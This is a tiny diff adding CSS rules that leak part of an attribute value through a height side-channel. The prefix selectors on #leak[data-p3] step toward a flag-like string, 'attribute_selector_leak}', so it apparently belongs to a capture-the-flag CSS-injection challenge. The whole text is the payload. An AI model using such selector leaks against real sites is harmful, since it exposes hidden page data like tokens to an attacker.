@@ -1,0 +1,6 @@
+/* Leak part 3 via height side-channel */
+#leak[data-p3^="attr"]{ height: 31px }
+#leak[data-p3^="attribute"]{ height: 32px }
+#leak[data-p3^="attribute_selector_"]{ height: 33px }
+#leak[data-p3^="attribute_selector_le"]{ height: 34px }
+#leak[data-p3="attribute_selector_leak}"]{ height: 35px }
